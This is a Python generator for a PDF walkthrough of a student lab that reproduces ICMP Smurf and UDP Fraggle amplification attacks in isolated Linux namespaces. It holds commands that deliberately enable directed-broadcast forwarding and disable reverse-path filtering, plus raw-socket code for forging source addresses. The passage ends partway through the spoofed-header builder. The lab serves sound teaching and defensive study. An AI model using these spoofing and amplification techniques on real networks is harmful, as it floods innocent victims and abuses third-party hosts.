#!/usr/bin/env python3
"""generate_walkthrough.py -- build the elaborate Smurf/Fraggle lab walkthrough PDF.

The prose is written in ASD-STE100 Simplified Technical English: short
sentences, active voice, present tense, and one instruction per sentence.
Technical names (protocol names, file names, command names, sysctl keys) are
kept exactly as they appear in the repository.

Run:  python3 generate_walkthrough.py
Out:  Smurf_Fraggle_Lab_Walkthrough.pdf
"""
from wt_engine import (Walkthrough, PRIMARY, AMPC, VICC, ATTC, AMBER, INK,
                       MUTE, CODEBD, RULEC)
from fpdf.enums import XPos, YPos

TITLE = "ICMP Smurf & UDP Fraggle Amplification Lab"
SUBTITLE = "Group 05, Subsection A2 - Complete Walkthrough"
FOOTER = "Smurf & Fraggle Lab - Complete Walkthrough (ASD-STE100)"


# ======================================================================
#  TABLE OF CONTENTS CALLBACK
# ======================================================================
def render_toc(pdf, outline):
    pdf.set_x(pdf.l_margin)
    pdf.set_font("sans", "B", 19)
    pdf.set_text_color(*PRIMARY)
    pdf.cell(0, 12, "Contents", new_x=XPos.LMARGIN, new_y=YPos.NEXT)
    pdf.set_draw_color(*PRIMARY)
    pdf.set_line_width(0.5)
    pdf.line(20, pdf.get_y() + 1, pdf.w - 20, pdf.get_y() + 1)
    pdf.ln(5)
    for e in outline:
        if e.level > 1:
            continue
        if e.level == 0:
            pdf.ln(1.6)
            size, style, col, indent = 10.5, "B", PRIMARY, 0
        else:
            size, style, col, indent = 9.3, "", INK, 8
        pagew = 12
        x = pdf.l_margin + indent
        pdf.set_x(x)
        pdf.set_font("sans", style, size)
        pdf.set_text_color(*col)
        avail = pdf.w - pdf.r_margin - x - pagew
        name = e.name
        while pdf.get_string_width(name) > avail - 2 and len(name) > 4:
            name = name[:-2]
        pdf.cell(avail, 5.8, name, new_x=XPos.RIGHT, new_y=YPos.TOP)
        pdf.set_font("sans", "", size)
        pdf.set_text_color(*MUTE)
        pdf.cell(pagew, 5.8, str(e.page_number), align="R",
                 new_x=XPos.LMARGIN, new_y=YPos.NEXT)
    pdf.set_text_color(*INK)


# ======================================================================
#  COVER PAGE
# ======================================================================
def build_cover(pdf):
    pdf.cover = True
    pdf.add_page()
    pdf.plain_pages.add(pdf.page_no())
    # top colour band
    pdf.set_fill_color(*PRIMARY)
    pdf.rect(0, 0, pdf.w, 70, style="F")
    pdf.set_fill_color(*ATTC)
    pdf.rect(0, 70, pdf.w, 2.4, style="F")
    pdf.set_xy(20, 20)
    pdf.set_font("sans", "B", 9)
    pdf.set_text_color(180, 205, 230)
    pdf.cell(0, 6, "GROUP 05  \u2022  SUBSECTION A2  \u2022  NETWORK SECURITY",
             new_x=XPos.LMARGIN, new_y=YPos.NEXT)
    pdf.set_xy(20, 32)
    pdf.set_font("sans", "B", 25)
    pdf.set_text_color(255, 255, 255)
    pdf.multi_cell(pdf.w - 40, 11,
                   "ICMP Smurf & UDP Fraggle\nDirected-Broadcast Amplification Lab",
                   new_x=XPos.LMARGIN, new_y=YPos.NEXT)

    pdf.set_xy(20, 84)
    pdf.set_font("sans", "", 13)
    pdf.set_text_color(*PRIMARY)
    pdf.multi_cell(pdf.w - 40, 7,
                   "A Complete Walkthrough of the Theory, Code, Environment, "
                   "Setup, Attacks, Defenses, and Measured Results",
                   new_x=XPos.LMARGIN, new_y=YPos.NEXT)

    pdf.ln(4)
    pdf.set_x(20)
    pdf.set_font("sans", "I", 10)
    pdf.set_text_color(*MUTE)
    pdf.multi_cell(pdf.w - 40, 5.4,
                   "Written in ASD-STE100 Simplified Technical English. Every file "
                   "in the repository is explained: the six-namespace lab, the four "
                   "hand-written packet senders, the echo amplifier, the measurement "
                   "harness, and the four-layer defense taxonomy.",
                   new_x=XPos.LMARGIN, new_y=YPos.NEXT)

    # warning box
    pdf.ln(6)
    y = pdf.get_y()
    pdf.set_draw_color(*ATTC)
    pdf.set_fill_color(250, 235, 233)
    pdf.set_line_width(0.4)
    pdf.rect(20, y, pdf.w - 40, 24)
    pdf.set_fill_color(*ATTC)
    pdf.rect(20, y, 2, 24, style="F")
    pdf.set_xy(25, y + 3)
    pdf.set_font("sans", "B", 10)
    pdf.set_text_color(*ATTC)
    pdf.cell(0, 5, "EDUCATIONAL USE ONLY", new_x=XPos.LMARGIN, new_y=YPos.NEXT)
    pdf.set_x(25)
    pdf.set_font("sans", "", 9)
    pdf.set_text_color(*INK)
    pdf.multi_cell(pdf.w - 50, 4.6,
                   "The lab runs only inside isolated Linux network namespaces. It "
                   "has no route to the internet or any real network. Do not point "
                   "the senders at any host you do not own and have permission to test.",
                   new_x=XPos.LMARGIN, new_y=YPos.NEXT)

    # meta block near the bottom
    pdf.set_xy(20, pdf.h - 55)
    pdf.set_draw_color(*RULEC)
    pdf.set_line_width(0.3)
    pdf.line(20, pdf.h - 56, pdf.w - 20, pdf.h - 56)
    pdf.set_font("sans", "", 9.5)
    pdf.set_text_color(*INK)
    meta = [
        ("Authors", "Md. Sadman Bin Tareq (2105040), Md. Mohi Uddin Sizan (2105039)"),
        ("Platform", "WSL2 / Ubuntu 24.04, Linux kernel 6.18 (also Google Cloud Shell)"),
        ("Environment", "6 network namespaces, 2 virtual bridges, 1 router"),
        ("Repository", "github.com/sadman-xo/smurf-attack-lab"),
    ]
    for k, v in meta:
        pdf.set_x(20)
        pdf.set_font("sans", "B", 9.5)
        pdf.set_text_color(*PRIMARY)
        pdf.cell(28, 6, k, new_x=XPos.RIGHT, new_y=YPos.TOP)
        pdf.set_font("sans", "", 9.5)
        pdf.set_text_color(*INK)
        pdf.cell(0, 6, v, new_x=XPos.LMARGIN, new_y=YPos.NEXT)
    pdf.cover = False


# ======================================================================
#  CONTENT BLOCKS
# ======================================================================
def content():
    B = []
    a = B.append

    # ---------------------------------------------------------------
    a(("h1", "0. About This Document"))
    a(("h2", "0.1 Purpose"))
    a(("p", "This document is a full walkthrough of the smurf-attack-lab "
        "repository. It explains the theory of the attack. It explains every "
        "code file. It explains the environment, the setup, the measurement, "
        "and the defenses. It also explains the results and the evidence."))
    a(("p", "The lab reproduces two classic denial-of-service attacks. The first "
        "attack is the ICMP Smurf attack. The second attack is its UDP twin, the "
        "Fraggle attack. Both attacks use one idea: directed-broadcast "
        "amplification. The lab measures the amplification. The lab then shows how "
        "to stop it."))
    a(("h2", "0.2 Audience"))
    a(("p", "The reader is a student or an engineer who studies network security. "
        "The reader knows basic IP networking. The reader does not need to know "
        "the Smurf attack before reading. This document teaches it from the start."))
    a(("h2", "0.3 The language of this document"))
    a(("p", "This document uses ASD-STE100 Simplified Technical English. This is a "
        "controlled language for technical writing. It makes the text clear and "
        "easy to read. The main rules are simple."))
    a(("bul", [
        "Each sentence is short. Each sentence gives one idea.",
        "The voice is active. The subject does the action.",
        "The tense is the present tense where possible.",
        "The words are simple and consistent. The same thing has the same name.",
        "Technical names stay the same. A command, a file, or a sysctl key keeps "
        "its exact spelling.",
    ]))
    a(("note", "A note on the term \"ASD STE100\"",
       "The slide deck in the repository uses \"ASD STE100\" as a course label. "
       "In this document the term keeps its true meaning: the ASD-STE100 "
       "Simplified Technical English standard. The prose follows that standard."))
    a(("h2", "0.4 Safety"))
    a(("p", "The lab is safe by design. All six namespaces are internal to one "
        "kernel. No namespace connects to a real network card. So the lab cannot "
        "reach the internet or a campus network. The vulnerable settings live "
        "only inside the namespaces. The teardown script removes them all."))
    a(("h2", "0.5 How to reproduce everything"))
    a(("p", "Two commands rebuild every result in this document. The first command "
        "runs the full attack-and-defense matrix. The second command runs the "
        "scaling experiment."))
    a(("code",
       "sudo bash run_all.sh       # every attack x every defense -> summary.tsv\n"
       "sudo bash scale_test.sh    # amplification factor vs. amplifier count"))

    # ---------------------------------------------------------------
    a(("h1", "1. The Theory"))
    a(("h2", "1.1 Denial of service, reflection, and amplification"))
    a(("p", "The Smurf attack is a reflection and amplification distributed "
        "denial-of-service (DDoS) attack. Three words in that name matter. Each "
        "word describes one part of the attack."))
    a(("kv", [
        ("Denial of service", "The goal is to make a target unreachable. The "
         "attacker does not steal data. The attacker buries the target under more "
         "traffic than it can process."),
        ("Reflection", "The attacker does not send packets straight to the victim. "
         "The packets bounce off innocent third-party machines. So the victim sees "
         "the flood come from those machines. This hides the attacker."),
        ("Amplification", "One packet from the attacker becomes many packets at the "
         "victim. This ratio is the amplification factor. It lets a weak attacker "
         "overwhelm a strong victim."),
    ]))
    a(("h2", "1.2 The amplification factor"))
    a(("p", "The amplification factor is the core measurement of this lab. It is "
        "the number of replies the victim receives divided by the number of "
        "requests the attacker sends."))
    a(("code",
       "amplification factor = replies received at victim / requests sent by attacker"))
    a(("p", "The factor is equal to the number of live amplifiers, which this "
        "document calls N. If N hosts answer, one request becomes N replies. The "
        "lab measures a factor of exactly 3.00 with three amplifiers. The factor "
        "grows to 8.00 with eight amplifiers. A real subnet can hold hundreds of "
        "hosts, so the factor can reach the hundreds."))
    a(("h2", "1.3 The three mechanisms that make the attack work"))
    a(("p", "The attack combines three ordinary mechanisms. None of the three is a "
        "bug on its own. Together they make the attack possible."))
    a(("num", [
        "IP source-address spoofing. The IP source field is only data. Nothing "
        "checks that a packet came from the address it claims. The attacker forges "
        "this field to the victim's address.",
        "ICMP echo (or UDP echo). A host that receives an echo request returns an "
        "echo reply. This is the normal ping mechanism (RFC 792). The Fraggle "
        "variant uses the UDP echo service instead (RFC 862).",
        "IP directed broadcast. A packet sent to a subnet's broadcast address is "
        "meant for every host on that subnet. An old router feature forwards such "
        "a packet and floods it to every host.",
    ]))
    a(("p", "The attacker sends one echo request. The source is forged to the "
        "victim. The destination is a subnet broadcast. The router copies the "
        "request to every host. Every host replies. Because the request looked "
        "like it came from the victim, every reply lands on the victim."))
    a(("h2", "1.4 The Smurf attack, step by step"))
    a(("p", "A normal ping is one-to-one. One host sends one echo request to one "
        "other host. That host answers with one echo reply. The source address is "
        "true. The Smurf attack changes this simple exchange into a flood. The "
        "timeline has four moments."))
    a(("kv", [
        ("t0", "The attacker sends one echo request. The source is the victim "
         "(spoofed). The destination is the subnet broadcast."),
        ("t1", "The gateway forwards the request as a link-layer broadcast. It "
         "reaches every host on the subnet."),
        ("t2", "Each of the N live hosts builds one echo reply."),
        ("t3", "Because the request looked like it came from the victim, all N "
         "replies go to the victim."),
    ]))
    a(("p", "At a steady send rate R, the victim receives about R times N replies "
        "per second. The attacker's own address never appears in the flood. The "
        "attack is named after the 1997 program smurf.c that automated it."))
    a(("h2", "1.5 The Fraggle attack (the UDP twin)"))
    a(("p", "The Fraggle attack is the Smurf attack over UDP. The idea is the "
        "same. Only the layer-4 protocol changes. Instead of a broadcast echo "
        "request, the attacker sends a spoofed UDP datagram to the UDP echo port "
        "(port 7) of a subnet broadcast."))
    a(("p", "Every host that runs an echo service answers the victim. So N hosts "
        "turn one request into N replies. The amplification is identical. The "
        "historical targets were the echo service (port 7) and the chargen service "
        "(port 19). Modern systems ship these services off. The lab runs a small "
        "echo service on each amplifier to recreate the old condition."))
    a(("h2", "1.6 The central thesis"))
    a(("note", "The thesis of the whole lab",
       "The misconfiguration, not the protocol, is the vulnerability. The same "
       "router misconfiguration (directed-broadcast forwarding) enables both "
       "Smurf and Fraggle. A fix for one protocol does not stop the other. Only "
       "a fix for the misconfiguration stops both.", PRIMARY))
    a(("p", "The lab proves this thesis with measurements. It shows that the "
        "router fix stops both attacks. It shows that a per-protocol host fix "
        "stops only one attack. Chapter 8 and Chapter 9 give the numbers."))
    a(("h2", "1.7 The packet and frame structure"))
    a(("p", "Read the attack packet from the outside in. This is the order a "
        "device unwraps it: the Ethernet frame, then the IP packet, then the ICMP "
        "message. Only a few fields differ from a normal ping."))
    a(("bul", [
        "Ethernet frame. It carries the packet across one hop. No link-layer field "
        "needs a change for the attack.",
        "IP header. The source IP is the victim's address (modified). This causes "
        "the reflection. The destination IP is the subnet broadcast (modified). "
        "This causes the amplification. The protocol field is 1 for ICMP or 17 for "
        "UDP. The header checksum must be recomputed.",
        "ICMP message. The outbound type is 8, code 0 (echo request). The inbound "
        "reply type is 0, code 0 (echo reply). The ICMP checksum must be "
        "recomputed.",
    ]))
    a(("p", "The table below compares a normal ping with the attack. It is Table 1 "
        "of the design report. The two forged address fields are the only real "
        "differences."))
    a(("table", [
        ["Field", "Normal ping", "Attack request (attacker->amp)", "Reply (host->victim)"],
        ["Source IP", "Sender's own IP", "Victim's IP (forged)", "Host's own IP"],
        ["Destination IP", "One unicast host", "Subnet broadcast", "Victim's IP"],
        ["ICMP Type/Code", "8 / 0", "8 / 0 (echo request)", "0 / 0 (echo reply)"],
        ["How many", "1 request, 1 reply", "1 packet sent", "N packets (one per host)"],
    ], [1.1, 1.3, 1.9, 1.5]))
    a(("h2", "1.8 History and standards"))
    a(("p", "The Smurf attack was a top-tier DDoS technique in the late 1990s. It "
        "brought down major internet service providers. The attack faded after the "
        "vulnerable behaviours stopped being the default. The relevant standards "
        "are listed below."))
    a(("table", [
        ["Standard", "Year", "What it defines"],
        ["RFC 768", "1980", "The UDP protocol and its pseudo-header checksum."],
        ["RFC 792", "1981", "ICMP, including the echo request and echo reply."],
        ["RFC 862", "1983", "The Echo Protocol (the UDP/TCP echo service on port 7)."],
        ["RFC 1071", "1988", "The 16-bit one's-complement Internet checksum."],
        ["RFC 2644", "1999", "Changed the router default so directed broadcasts are "
         "not forwarded."],
        ["BCP 38 / RFC 2827", "2000", "Ingress filtering to defeat source-address "
         "spoofing."],
    ], [1.1, 0.6, 3.0]))

    # ---------------------------------------------------------------
    a(("h1", "2. The Repository Layout"))
    a(("p", "This chapter lists every file in the repository. Each entry gives a "
        "one-line description. The chapters that follow explain the files in "
        "detail."))
    a(("h2", "2.1 The file tree"))
    a(("code",
       "smurf-attack-lab/\n"
       "  README.md                 project overview and quick start\n"
       "  tutorial.md               Google Cloud Shell click-through tutorial\n"
       "  .gitattributes            keep LF line endings; mark pcap/pdf binary\n"
       "  .gitignore                ignore built C binaries and cruft\n"
       "  reports/\n"
       "    Smurf_Attack_Design_Report_4.pdf   the design report (deliverable)\n"
       "    Final_Report_Group05_A2.pdf        the final report (results)\n"
       "  slides/\n"
       "    smurf_fraggle_slides.tex           Beamer slide deck (LaTeX)\n"
       "  docs/\n"
       "    Smurf_Fraggle_Lab_Walkthrough.pdf  this document\n"
       "    generate_walkthrough.py            the generator for this document\n"
       "    wt_engine.py                       the PDF rendering engine\n"
       "  lab/\n"
       "    IMPLEMENTATION_PLAN.md   how the lab maps to the report\n"
       "    README.md                the lab usage guide\n"
       "    lab.env                  topology constants (single source of truth)\n"
       "    preflight.sh             check the kernel can run the lab\n"
       "    setup_lab.sh             build namespaces + vulnerable config\n"
       "    teardown_lab.sh          remove everything\n"
       "    run_attack.sh            launch one sender in the attacker namespace\n"
       "    measure.sh               run one attack + compute the factor\n"
       "    defend.sh                apply or revert the defenses\n"
       "    run_all.sh               reproduce the whole matrix\n"
       "    scale_test.sh            sweep the amplifier count\n"
       "    src/\n"
       "      smurf.py / smurf.c     ICMP Smurf senders (Python + C)\n"
       "      fraggle.py / fraggle.c UDP Fraggle senders (Python + C)\n"
       "      udp_echo.py            the UDP echo amplifier service\n"
       "    results/\n"
       "      RESULTS.md             the measured evidence, explained\n"
       "      summary.tsv            one row per attack/defense run\n"
       "      scaling.tsv            the amplifier-count sweep\n"
       "      *.pcap                 victim-side packet captures"))
    a(("h2", "2.2 What is the report and what is an extension"))
    a(("p", "The design report designs the classic ICMP Smurf attack. Three parts "
        "of the lab go beyond the report. They exist to test the report's own "
        "thesis with real measurements."))
    a(("bul", [
        "The Fraggle (UDP) variant. It proves that a different protocol amplifies "
        "the same way.",
        "The amplifier-count scaling experiment. It proves that the factor tracks "
        "the number of amplifiers.",
        "The edge source-guard defense. It proves that source validation at the "
        "edge stops both attacks.",
    ]))

    # ---------------------------------------------------------------
    a(("h1", "3. The Environment and Prerequisites"))
    a(("h2", "3.1 Why Linux network namespaces"))
    a(("p", "A network namespace is an isolated virtual network stack inside one "
        "Linux kernel. It has its own interfaces, its own routes, and its own "
        "sysctl settings. The lab builds the whole network from namespaces. There "
        "are no virtual machines and no cloud hosts. This keeps the lab small, "
        "fast, and safe."))
    a(("p", "The whole lab is six namespaces on two virtual bridges. A router "
        "namespace joins the two bridges. Nothing is bridged to a real network "
        "card. So every packet stays inside the kernel."))
    a(("h2", "3.2 The required kernel features"))
    a(("p", "The lab needs three kernel features. Some environments do not have "
        "all three. The default Microsoft WSL2 kernel is the common gap."))
    a(("table", [
        ["Feature", "sysctl / mechanism", "Why the lab needs it"],
        ["Network namespaces", "ip netns", "To build the six isolated hosts."],
        ["Linux bridge", "ip link add type bridge", "To make the two subnets."],
        ["veth pairs", "ip link add type veth", "To connect a host to a bridge."],
        ["Directed-broadcast forwarding", "net.ipv4.conf.*.bc_forwarding",
         "The one feature the attack depends on. Needs kernel 5.1 or newer."],
        ["IP forwarding", "net.ipv4.ip_forward", "So the router forwards packets."],
        ["Broadcast-echo control", "net.ipv4.icmp_echo_ignore_broadcasts",
         "So an amplifier can answer or ignore a broadcast ping."],
        ["nftables bridge family", "nft ... table bridge",
         "Only for the spoofguard defense. Optional."],
    ], [1.4, 2.0, 2.4]))
    a(("h2", "3.3 The required software tools"))
    a(("bul", [
        "iproute2 (the ip command). It builds the namespaces, veth pairs, and "
        "bridges. It is required.",
        "python3. It runs the Python senders and the echo service. It is required.",
        "gcc. It builds the C senders on demand. It is required for the C engine.",
        "tcpdump. It captures a pcap at the victim. It is optional; the kernel "
        "counters are used if it is absent.",
        "iputils-ping. It runs the unicast reachability check. It is optional; a "
        "raw-socket probe is used if it is absent.",
        "nftables (nft). It installs the source-guard rule. It is optional.",
    ]))
    a(("p", "The lab needs root for the ip netns commands. Every script re-runs "
        "itself under sudo if it is not root."))
    a(("h2", "3.4 The preflight check (preflight.sh)"))
    a(("p", "The preflight script checks that the current kernel can run the lab. "
        "It builds a throwaway namespace. It tries each feature. It prints a PASS "
        "or FAIL verdict for each one. It changes nothing permanent. It deletes "
        "its scratch namespace at the end."))
    a(("p", "The script checks the tools, then the required kernel features, then "
        "the optional features. If a required check fails, the script prints the "
        "reason and a hint. The most common failure is the default WSL2 kernel "
        "without a bridge or without bc_forwarding."))
    a(("code",
       "# run the check before you build the lab\n"
       "cd lab && sudo bash preflight.sh\n\n"
       "== Required kernel features ==\n"
       "  PASS  network namespaces (ip netns)\n"
       "  PASS  Linux bridge device (type bridge)\n"
       "  PASS  veth pair (type veth)\n"
       "  PASS  directed-broadcast forwarding (bc_forwarding)\n"
       "  PASS  IPv4 forwarding (ip_forward)\n"
       "  PASS  broadcast-echo control (icmp_echo_ignore_broadcasts)"))
    a(("h2", "3.5 The supported platforms"))
    a(("kv", [
        ("Native Linux", "Any modern Linux host or container with CAP_NET_ADMIN "
         "works. This is the best choice."),
        ("WSL2 Ubuntu", "It works only if the kernel has the bridge and "
         "bc_forwarding features. The default WSL2 kernel often lacks them. Run "
         "preflight.sh to check."),
        ("Google Cloud Shell", "It works. The README has a one-click button. The "
         "tutorial.md file drives a click-through in the Cloud Shell editor."),
    ]))

    # ---------------------------------------------------------------
    a(("h1", "4. The Topology and Addressing"))
    a(("h2", "4.1 The topology"))
    a(("p", "The lab has two layer-2 segments. Each segment is a virtual bridge. A "
        "router namespace joins the two bridges. The amplifiers are on one "
        "segment. The victim and the attacker are on the other segment."))
    a(("code",
       "   amp subnet 10.0.10.0/24 (br-amp)      victim subnet 10.0.20.0/24 (br-vic)\n"
       " amp1 .11  \u2510                                 \u250c victim   .100 (tcpdump / counters)\n"
       " amp2 .12  \u253c\u2500\u2500 br-amp \u2500\u2500 [ router ] \u2500\u2500 br-vic \u2500\u253c\n"
       " amp3 .13  \u2518   .1        forwards        .1   \u2518 attacker .50  (crafts the packet)"))
    a(("p", "Both bridges live inside the router namespace. They are the router's "
        "layer-3 interfaces. So the only path between the two subnets is through "
        "the router. This is the key to the isolation."))
    a(("h2", "4.2 The single source of truth (lab.env)"))
    a(("p", "The file lab.env holds every constant. Every script reads this file. "
        "So the addresses never drift. To change the topology, edit this file "
        "only."))
    a(("table", [
        ["Constant", "Value", "Meaning"],
        ["AMP_SUBNET", "10.0.10", "The amplifier /24 network prefix."],
        ["AMP_BCAST", "10.0.10.255", "The directed broadcast the attacker aims at."],
        ["ROUTER_AMP_IP", "10.0.10.1", "The router interface on the amp side."],
        ["AMP_COUNT", "3", "The number of amplifiers. Override per run."],
        ["VIC_SUBNET", "10.0.20", "The victim /24 network prefix."],
        ["ROUTER_VIC_IP", "10.0.20.1", "The router interface on the victim side."],
        ["VICTIM_IP", "10.0.20.100", "The spoofed source and the flood destination."],
        ["ATTACKER_IP", "10.0.20.50", "The host that sends the forged requests."],
        ["FRAGGLE_PORT", "7", "The UDP echo port (the Fraggle target)."],
        ["FRAGGLE_SPORT", "40000", "The spoofed source port. Replies land here."],
        ["SG_TABLE", "smurf_sg", "The nft bridge table for the source guard."],
        ["ATT_PORT", "r-att", "The router-side port that faces the attacker."],
    ], [1.2, 1.1, 2.7]))
    a(("h2", "4.3 The namespaces, bridges, and veth pairs"))
    a(("p", "The lab has six namespaces: router, attacker, victim, amp1, amp2, and "
        "amp3. Each namespace uses a few megabytes. The router holds the two "
        "bridges: br-amp and br-vic. Each host connects to a bridge with a veth "
        "pair. One end of the pair becomes eth0 inside the host. The other end "
        "joins a bridge inside the router."))

    # ---------------------------------------------------------------
    a(("h1", "5. Building the Lab (setup_lab.sh)"))
    a(("p", "The setup script builds the whole lab. It also applies the "
        "deliberately vulnerable configuration. It then runs a self-test. This "
        "chapter follows the script in order."))
    a(("h2", "5.1 Root and cleanup"))
    a(("p", "The script needs root, so it re-runs itself under sudo. It then calls "
        "the teardown script to remove any previous lab. This makes the build "
        "repeatable."))
    a(("code",
       "if [ \"$(id -u)\" -ne 0 ]; then exec sudo -E bash \"$0\" \"$@\"; fi\n"
       "bash \"$SCRIPT_DIR/teardown_lab.sh\" >/dev/null 2>&1 || true"))
    a(("h2", "5.2 The router namespace and two bridges"))
    a(("p", "The script creates the router namespace. It adds the two bridges "
        "inside it. It gives each bridge a gateway address. It brings the bridges "
        "up."))
    a(("code",
       "ip netns add \"$NS_ROUTER\"\n"
       "ip -n \"$NS_ROUTER\" link add \"$BR_AMP\" type bridge\n"
       "ip -n \"$NS_ROUTER\" link add \"$BR_VIC\" type bridge\n"
       "ip -n \"$NS_ROUTER\" addr add \"${ROUTER_AMP_IP}/24\" dev \"$BR_AMP\"\n"
       "ip -n \"$NS_ROUTER\" addr add \"${ROUTER_VIC_IP}/24\" dev \"$BR_VIC\""))
    a(("h2", "5.3 The add_host function"))
    a(("p", "The add_host function attaches one host to one bridge. It runs the "
        "same steps for every host. This keeps the topology consistent."))
    a(("num", [
        "Create the host namespace and bring up its loopback.",
        "Create a veth pair. One end is the router-side port. The other end is "
        "p-<name>.",
        "Move the router-side end into the router namespace and attach it to the "
        "bridge.",
        "Move the other end into the host namespace and rename it eth0.",
        "Give eth0 its address. Bring it up. Add a default route to the gateway.",
    ]))
    a(("code",
       "add_host() {\n"
       "  local ns=\"$1\" rif=\"$2\" br=\"$3\" cidr=\"$4\" gw=\"$5\"\n"
       "  ip netns add \"$ns\"\n"
       "  ip link add \"$rif\" type veth peer name \"p-$ns\"\n"
       "  ip link set \"$rif\" netns \"$NS_ROUTER\"\n"
       "  ip link set \"p-$ns\" netns \"$ns\"\n"
       "  ip -n \"$NS_ROUTER\" link set \"$rif\" master \"$br\"\n"
       "  ip -n \"$ns\" link set \"p-$ns\" name eth0\n"
       "  ip -n \"$ns\" addr add \"$cidr\" dev eth0\n"
       "  ip -n \"$ns\" route add default via \"$gw\"\n"
       "}"))
    a(("h2", "5.4 Attaching the hosts"))
    a(("p", "The script attaches the victim and the attacker to the victim bridge. "
        "It then attaches the amplifiers to the amp bridge. The number of "
        "amplifiers comes from AMP_COUNT."))
    a(("code",
       "add_host victim   r-vic  \"$BR_VIC\" \"${VICTIM_IP}/24\"   \"$ROUTER_VIC_IP\"\n"
       "add_host attacker r-att  \"$BR_VIC\" \"${ATTACKER_IP}/24\" \"$ROUTER_VIC_IP\"\n"
       "for i in $(seq 1 \"$AMP_COUNT\"); do\n"
       "  add_host \"amp$i\" \"r-amp$i\" \"$BR_AMP\" \"${AMP_SUBNET}.$((10 + i))/24\" \\\n"
       "           \"$ROUTER_AMP_IP\"\n"
       "done"))
    a(("h2", "5.5 The deliberately vulnerable configuration"))
    a(("p", "The script now recreates the historical conditions. It turns on the "
        "settings that a modern system turns off. All of these settings live only "
        "inside the namespaces."))
    a(("bul", [
        "On the router: turn on ip_forward. Turn on bc_forwarding for all "
        "interfaces and for both bridges. This is the root cause.",
        "On the router: turn off rp_filter. So the forged source is not dropped "
        "by a reverse-path check.",
        "On each amplifier: set icmp_echo_ignore_broadcasts to 0. So each "
        "amplifier answers a broadcast ping.",
    ]))
    a(("code",
       "ip netns exec \"$NS_ROUTER\" sysctl -qw net.ipv4.ip_forward=1\n"
       "ip netns exec \"$NS_ROUTER\" sysctl -qw net.ipv4.conf.all.bc_forwarding=1\n"
       "ip netns exec \"$NS_ROUTER\" sysctl -qw net.ipv4.conf.${BR_AMP}.bc_forwarding=1\n"
       "ip netns exec \"$NS_ROUTER\" sysctl -qw net.ipv4.conf.${BR_VIC}.bc_forwarding=1\n"
       "ip netns exec \"$NS_ROUTER\" sysctl -qw net.ipv4.conf.all.rp_filter=0\n"
       "for i in $(seq 1 \"$AMP_COUNT\"); do\n"
       "  ip netns exec \"amp$i\" sysctl -qw net.ipv4.icmp_echo_ignore_broadcasts=0\n"
       "done"))
    a(("note", "Why bc_forwarding is the root cause",
       "bc_forwarding tells the router to accept a unicast packet addressed to a "
       "subnet's directed broadcast and to forward it as a link-layer broadcast. "
       "This reaches every host on the subnet. Without it the attack fails, "
       "whatever the protocol.", ATTC))
    a(("h2", "5.6 The Fraggle responders"))
    a(("p", "The script starts one UDP echo service on each amplifier. This "
        "service is the Fraggle amplifier. The script detaches it with setsid so "
        "it survives the script. The teardown script stops it later by its command "
        "line."))
    a(("code",
       "for i in $(seq 1 \"$AMP_COUNT\"); do\n"
       "  ip netns exec \"amp$i\" setsid python3 \"$SCRIPT_DIR/src/udp_echo.py\" \\\n"
       "    \"$FRAGGLE_PORT\" </dev/null >/dev/null 2>&1 &\n"
       "done"))
    a(("h2", "5.7 The connectivity check"))
    a(("p", "The script checks normal routing with unicast pings. It checks the "
        "path from the attacker to the router, and from the attacker and the "
        "victim to an amplifier. If ping is not installed, the script uses a "
        "raw-socket probe instead."))
    a(("h2", "5.8 The amplification self-test"))
    a(("p", "The script then confirms that the amplification path is live. It uses "
        "its own hand-written senders with a true (non-spoofed) source. It sends "
        "one broadcast request for each protocol. It reads the attacker's kernel "
        "counters to count the replies."))
    a(("p", "One broadcast request should draw AMP_COUNT replies. The self-test "
        "prints the count for Smurf (ICMP) and for Fraggle (UDP). If both counts "
        "are two or more, the path is live for both attacks."))
    a(("code",
       "Smurf  (ICMP): one broadcast request drew 3 echo-replies (expected 3)\n"
       "Fraggle (UDP): one broadcast request drew 3 echo-replies (expected 3)\n"
       "=> amplification path is LIVE for both Smurf and Fraggle"))
    a(("note", "No external tool ever makes attack traffic",
       "The self-test uses the lab's own raw senders with the attacker's real "
       "address. The unicast ping is used only for the plain reachability check. "
       "No ready-made tool such as hping, nping, or scapy is used anywhere in the "
       "lab.", VICC))

    # ---------------------------------------------------------------
    a(("h1", "6. The Attack Code"))
    a(("p", "The lab has four senders and one echo service. Every sender builds "
        "each header field by hand. Every sender computes each checksum by hand. "
        "No ready-made packet tool is used. This chapter explains each file."))
    a(("h2", "6.1 Raw sockets and IP_HDRINCL"))
    a(("p", "Each sender opens a raw socket of type IPPROTO_RAW. It sets the "
        "IP_HDRINCL option. This tells the kernel that the program provides the "
        "full IP header. So the program controls every field, including the source "
        "address. Each sender also sets SO_BROADCAST so it can send to a broadcast "
        "address."))
    a(("code",
       "s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)\n"
       "s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n"
       "s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)"))
    a(("h2", "6.2 The RFC 1071 checksum"))
    a(("p", "All three checksums (IP, ICMP, and UDP) use the same function. It is "
        "the 16-bit one's-complement Internet checksum from RFC 1071. The function "
        "sums the data as 16-bit words. It folds the carries. It returns the "
        "one's complement of the sum."))
    a(("code",
       "def checksum(data: bytes) -> int:\n"
       "    if len(data) % 2:\n"
       "        data += b\"\\x00\"\n"
       "    total = 0\n"
       "    for i in range(0, len(data), 2):\n"
       "        total += (data[i] << 8) | data[i + 1]   # sum 16-bit words\n"
       "    total = (total >> 16) + (total & 0xFFFF)     # fold carries\n"
       "    total += total >> 16\n"
       "    return (~total) & 0xFFFF"))
    a(("h2", "6.3 The ICMP Smurf sender (smurf.py)"))
    a(("p", "The Python sender is the bring-up tool. It builds the IP header. It "
        "sets the source to the victim and the destination to the broadcast. It "
        "computes the IP checksum. It then builds the ICMP echo request with type "
        "8 and code 0. It computes the ICMP checksum. It sends the packet in a "
        "rate-controlled loop."))
    a(("code",
       "def build_ip_header(src, dst, payload_len, ip_id):\n"
       "    total_len = 20 + payload_len\n"
       "    ihl_ver = (4 << 4) | 5           # IPv4, 20-byte header\n"
       "    fields = (ihl_ver, 0, total_len, ip_id, 0, 64,\n"
       "              socket.IPPROTO_ICMP, 0,\n"
       "              socket.inet_aton(src), socket.inet_aton(dst))\n"
       "    header = struct.pack(\"!BBHHHBBH4s4s\", *fields)   # checksum = 0\n"
       "    chk = checksum(header)\n"
       "    fields = fields[:7] + (chk,) + fields[8:]\n"
